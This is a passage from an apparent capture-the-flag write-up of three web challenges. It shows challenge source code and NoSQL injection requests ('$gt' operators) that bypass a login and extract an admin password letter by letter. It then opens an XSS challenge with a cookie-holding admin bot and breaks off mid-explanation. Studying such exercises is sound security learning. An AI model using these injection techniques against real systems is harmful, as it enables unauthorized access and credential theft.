operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> secret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        res<span class=\"token punctuation\">.</span><span class=\"token function\">redirect</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/site\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<hr>\n<h2>Solution</h2>\n<p>The website presents a username and password login form with the source code below it. Looking at the source code, we spot a standard query injection vulnerability. Essentially, we are trying to do the NoSQL equivalent of an SQL <code>' or 1=1</code> attack. <a href=\"https://zanon.io/posts/nosql-injection-in-mongodb\">This post</a> gives a good overview of simple NoSQL injection vulnerabilities. All we need to do is pass a query through as input fields such that it will return at least one piece of data.\nIf we try and put something like <code>{ \"$gt\": \"\" }</code> for the username and password, we won't get any results. This is because these inputs are interpreted as strings and not deserialized json for the query interpreter to execute.\nTo help us post actual json, we can use something like <a href=\"https://portswigger.net/burp\">Burp Suite</a> or <a href=\"https://httpie.org/\">HTTPie</a> (I much prefer the latter 😋).</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token operator\">></span> http --session<span class=\"token operator\">=</span>actf --follow https//nosequels.2019.chall.actf.co/login username:<span class=\"token operator\">=</span><span class=\"token string\">'{ \"$gt\": \"\" }'</span> password:<span class=\"token operator\">=</span><span class=\"token string\">'{ \"$gt\": \"\" }'</span>\n<span class=\"token punctuation\">..</span>.\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span>DOCTYPE html<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>html <span class=\"token assign-left variable\">lang</span><span class=\"token operator\">=</span><span class=\"token string\">\"en\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>head<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>meta <span class=\"token assign-left variable\">charset</span><span class=\"token operator\">=</span><span class=\"token string\">\"UTF-8\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>title<span class=\"token operator\">></span>Application Access Page<span class=\"token operator\">&lt;</span>/title<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>/head<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>body<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>h<span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>Here<span class=\"token string\">'s your first flag: actf{no_sql_doesn'</span>t_mean_no_vuln<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">..</span>.</code></pre></div>\n<h3>Notes</h3>\n<p>The challenge website uses jwt and doesn't allow any submissions without a token, hence the use of <code>--session</code></p>\n<hr>\n<h2>No Sequels 2</h2>\n<h3>Web - 80 points (solved)</h3>\n<blockquote>\n<p>This is the sequel to No Sequels. You'll see the challenge page once you solve the first one.</p>\n<p>Author: SirIan</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> html<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>html lang<span class=\"token operator\">=</span><span class=\"token string\">\"en\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>head<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>meta charset<span class=\"token operator\">=</span><span class=\"token string\">\"UTF-8\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>title<span class=\"token operator\">></span>Application Access Page<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>head<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>body<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>h2<span class=\"token operator\">></span>Here<span class=\"token string\">'s your first flag: actf{no_sql_doesn'</span>t_mean_no_vuln<span class=\"token punctuation\">}</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">></span>Access granted<span class=\"token punctuation\">,</span> however suspicious activity detected<span class=\"token punctuation\">.</span> Please enter password <span class=\"token keyword\">for</span> user<span class=\"token operator\">&lt;</span>b<span class=\"token operator\">></span> <span class=\"token string\">'admin'</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>b<span class=\"token operator\">></span>again<span class=\"token punctuation\">,</span> but there will be no database query<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h2<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>form method<span class=\"token operator\">=</span><span class=\"token string\">\"post\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>label<span class=\"token operator\">></span>Enter Password<span class=\"token operator\">:</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>label<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string\">\"text\"</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"pass2\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string\">\"submit\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>h4 style<span class=\"token operator\">=</span><span class=\"token string\">\"color:red;\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h4<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>pre<span class=\"token operator\">></span>router<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/site'</span><span class=\"token punctuation\">,</span> verifyJwt<span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// req.user is assigned from verifyJwt</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>req<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">.</span>authenticated <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>pass2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bad\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n \n    <span class=\"token keyword\">var</span> query <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n        username<span class=\"token operator\">:</span> req<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span>\n \n    <span class=\"token keyword\">var</span> db <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>db<span class=\"token punctuation\">;</span>\n    db<span class=\"token punctuation\">.</span><span class=\"token function\">collection</span><span class=\"token punctuation\">(</span><span class=\"token string\">'users'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">findOne</span><span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">err<span class=\"token punctuation\">,</span> user</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            res<span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token string\">'access'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>username<span class=\"token operator\">:</span><span class=\"token string\">' \\''</span><span class=\"token operator\">+</span>req<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">.</span>name<span class=\"token operator\">+</span><span class=\"token string\">'\\' '</span><span class=\"token punctuation\">,</span> message<span class=\"token operator\">:</span><span class=\"token string\">\"Only user 'admin' can log in with this form!\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">var</span> pass <span class=\"token operator\">=</span> user<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> message <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pass <span class=\"token operator\">===</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>pass2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            res<span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token string\">'final'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n            res<span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token string\">'access'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>username<span class=\"token operator\">:</span><span class=\"token string\">' \\''</span><span class=\"token operator\">+</span>req<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">.</span>name<span class=\"token operator\">+</span><span class=\"token string\">'\\' '</span><span class=\"token punctuation\">,</span> message<span class=\"token operator\">:</span><span class=\"token string\">\"Wrong LOL!\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n \n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>pre<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">></span></code></pre></div>\n<hr>\n<h2>Solution</h2>\n<p>The sequel to No Sequels is presented after completing the first part of the challenge. This challenge requires us to find the plaintext password for the admin account. The input form on this second page doesn't look like it will help us at all with finding the admin's password. Instead, we go back to the first challenge and realise that we can get the password there by bruteforcing the password field.\nIf we use the same command as the last challenge, but instead query about the password, we can slowly build the password.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token operator\">></span> http --session<span class=\"token operator\">=</span>actf --follow https//nosequels.2019.chall.actf.co/login <span class=\"token assign-left variable\">username</span><span class=\"token operator\">=</span>admin password:<span class=\"token operator\">=</span><span class=\"token string\">'{ \"$gt\": \"m\" }'</span>\n\n<span class=\"token punctuation\">(</span>does not give us the flag <span class=\"token keyword\">for</span> chall <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>So by asking if the password is greater than <code>'m'</code> and getting the 'wrong password' response, we know that the password must be less than <code>'m'</code>. So we try with the letter <code>'g'</code>, and it turns out that's incorrect too. We lower our guess to <code>'d'</code> which is also incorrect, meaning the password must start with something that is less than<code>'d'</code>. If we tried <code>'b'</code>, we get the flag, but this doesn't confirm that the password starts with <code>'b'</code>. Trying with <code>'c'</code> also gives us the flag and confirms that the password starts with <code>'c'</code> as the next letter after <code>'c'</code> doesn't get us the flag.</p>\n<p>We then follow a similar process to get the next letter.</p>\n<p>Essentially, we binary search for each letter until we get something that seems like the password. We could write a script to do this, but due to the nature of binary search, it won't take very long to do it manually.</p>\n<p>The admin's password is <code>congratsyouwin</code></p>\n<p>Entering this into the form gives us the flag: <code>actf{still_no_sql_in_the_sequel}</code></p>\n<h3>Notes</h3>\n<p>This challenge can also be solved using <a href=\"https://docs.mongodb.com/manual/reference/operator/query/regex/\"><code>\"$regex\"</code></a>.</p>\n<hr>\n<h2>DOM Validator</h2>\n<h3>Web - 130 points (solved)</h3>\n<blockquote>\n<p>Always remember to validate your DOMs before you <a href=\"https://dom.2019.chall.actf.co/\">render them</a>.</p>\n<p>Author: kmh11</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> express <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'express'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token function\">express</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\napp<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>express<span class=\"token punctuation\">.</span><span class=\"token function\">urlencoded</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> extended<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\napp<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>express<span class=\"token punctuation\">.</span><span class=\"token function\">static</span><span class=\"token punctuation\">(</span><span class=\"token string\">'public'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\napp<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tres<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;!doctype html>\n&lt;html>\n&lt;head>\n&lt;link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/skeleton/2.0.4/skeleton.min.css\">\n&lt;/head>\n&lt;body style=\"background-color: black; text-align: center;\">\n&lt;h1 style=\"color: white; margin-top: 2em;\">Create Post&lt;/h1>\n&lt;form action='/posts' method='POST'>\n&lt;input name='title' placeholder='Post title'>&lt;br>\n&lt;textarea name='content' placeholder='Post content'>&lt;/textarea>&lt;br>\n&lt;button type='submit' style=\"color: white\">Create Post&lt;/button>\n&lt;/form>\n&lt;h1 style=\"color: white\">Report Post&lt;/h1>\n&lt;form action='/report' method='POST'>\n&lt;input name='url' placeholder='Post URL'>&lt;br>\n&lt;button type='submit' style=\"color: white\">Report Post&lt;/button>\n&lt;/form>\n&lt;/body>\n&lt;/html></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">var</span> fs <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'fs'</span><span class=\"token punctuation\">)</span>\napp<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/posts'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">// title must be a valid filename</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^[\\w\\-. ]+$</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">'..'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">sendStatus</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fs<span class=\"token punctuation\">.</span><span class=\"token function\">existsSync</span><span class=\"token punctuation\">(</span><span class=\"token string\">'public/posts/'</span> <span class=\"token operator\">+</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>title <span class=\"token operator\">+</span> <span class=\"token string\">'.html'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">sendStatus</span><span class=\"token punctuation\">(</span><span class=\"token number\">409</span><span class=\"token punctuation\">)</span>\n\tfs<span class=\"token punctuation\">.</span><span class=\"token function\">writeFileSync</span><span class=\"token punctuation\">(</span><span class=\"token string\">'public/posts/'</span> <span class=\"token operator\">+</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>title <span class=\"token operator\">+</span> <span class=\"token string\">'.html'</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;!DOCTYPE html SYSTEM \"3b16c602b53a3e4fc22f0d25cddb0fc4d1478e0233c83172c36d0a6cf46c171ed5811fbffc3cb9c3705b7258179ef11362760d105fb483937607dd46a6abcffc\">\n&lt;html>\n\t&lt;head>\n\t\t&lt;link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/skeleton/2.0.4/skeleton.min.css\">\n\t\t&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/sha512.js\">&lt;/script>\n\t\t&lt;script src=\"../scripts/DOMValidator.js\">&lt;/script>\n\t&lt;/head>\n\t&lt;body>\n\t\t&lt;h1></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>title<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">&lt;/h1>\n\t\t&lt;p></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>content<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">&lt;/p>\n\t&lt;/body>\n&lt;/html></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span>\n\tres<span class=\"token punctuation\">.</span><span class=\"token function\">redirect</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/posts/'</span> <span class=\"token operator\">+</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>title <span class=\"token operator\">+</span> <span class=\"token string\">'.html'</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// admin visiting page</span>\n<span class=\"token keyword\">var</span> puppeteer <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'puppeteer'</span><span class=\"token punctuation\">)</span>\napp<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/report'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tres<span class=\"token punctuation\">.</span><span class=\"token function\">sendStatus</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">var</span> browser <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> puppeteer<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n\t\t\targs<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'--no-sandbox'</span><span class=\"token punctuation\">]</span>\n\t\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">var</span> page <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> browser<span class=\"token punctuation\">.</span><span class=\"token function\">newPage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">await</span> page<span class=\"token punctuation\">.</span><span class=\"token function\">setCookie</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n\t\t\tname<span class=\"token operator\">:</span> <span class=\"token string\">'flag'</span><span class=\"token punctuation\">,</span>\n\t\t\tvalue<span class=\"token operator\">:</span> process<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span><span class=\"token constant\">FLAG</span><span class=\"token punctuation\">,</span>\n\t\t\tdomain<span class=\"token operator\">:</span> req<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'host'</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">await</span> page<span class=\"token punctuation\">.</span><span class=\"token function\">goto</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>url<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'waitUntil'</span><span class=\"token operator\">:</span> <span class=\"token string\">'networkidle0'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\tconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n\napp<span class=\"token punctuation\">.</span><span class=\"token function\">listen</span><span class=\"token punctuation\">(</span><span class=\"token number\">3002</span><span class=\"token punctuation\">)</span></code></pre></div>\n<hr>\n<h2>Solution</h2>\n<p>We are given a website and its source code. The website lets the user create posts with a title and a body, saves that post to a html file on the server and lets people view these posts if they have the url. The website also lets the user report posts to the admin which will prompt the server to visit the post url (using puppeteer). We also notice in the source code that the browser being used to visit the url we report gets a cookie set to the domain which contains the flag. So our task is to somehow retrieve this cookie.</p>\n<p>The first thing that comes to mind is some sort of XSS attack, but typing in <code>&#x3C;script>alert(1)&#x3C;/script></code> as the body for our post doesn't produce any alerts. We take a look at how the posts are being validated. In the given source code we see there is a client side script being used to validate the post.</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// ../scripts/DOMValidator.js</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">checksum</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">element</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">var</span> string <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\tstring <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span>element<span class=\"token punctuation\">.</span>attributes <span class=\"token operator\">?</span> element<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">.</span>length <span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'|'</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>element<span class=\"token punctuation\">.</span>attributes <span class=\"token operator\">?</span> element<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">.</span>length <span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\tstring <span class=\"token operator\">+=</span> element<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">':'</span> <span class=\"token operator\">+</span> element<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>value <span class=\"token operator\">+</span> <span class=\"token string\">'|'</span>\n\t<span class=\"token punctuation\">}</span>\n\tstring <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span>element<span class=\"token punctuation\">.</span>childNodes <span class=\"token operator\">?</span> element<span class=\"token punctuation\">.</span>childNodes<span class=\"token punctuation\">.</span>length <span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'|'</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>element<span class=\"token punctuation\">.</span>childNodes <span class=\"token operator\">?</span> element<span class=\"token punctuation\">.</span>childNodes<span class=\"token punctuation\">.</span>length <span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\tstring <span class=\"token operator\">+=</span> <span class=\"token function\">checksum</span><span class=\"token punctuation\">(</span>element<span class=\"token punctuation\">.</span>childNodes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'|'</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> CryptoJS<span class=\"token punctuation\">.</span><span class=\"token constant\">SHA512</span><span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span>CryptoJS<span class=\"token punctuation\">.</span>enc<span class=\"token punctuation\">.</span>Hex<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">var</span> request <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XMLHttpRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nrequest<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span>\nrequest<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">checksum</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DOMParser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseFromString</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>responseText<span class=\"token punctuation\">,</span> <span class=\"token string\">'text/html'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> document<span class=\"token punctuation\">.</span>doctype<span class=\"token punctuation\">.</span>systemId<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tdocument<span class=\"token punctuation\">.</span>documentElement<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>We aren't really required to understand this code completely. In fact, just experimenting with the website a bit, we come to the conclusion that the validation removes the entire document if there are any 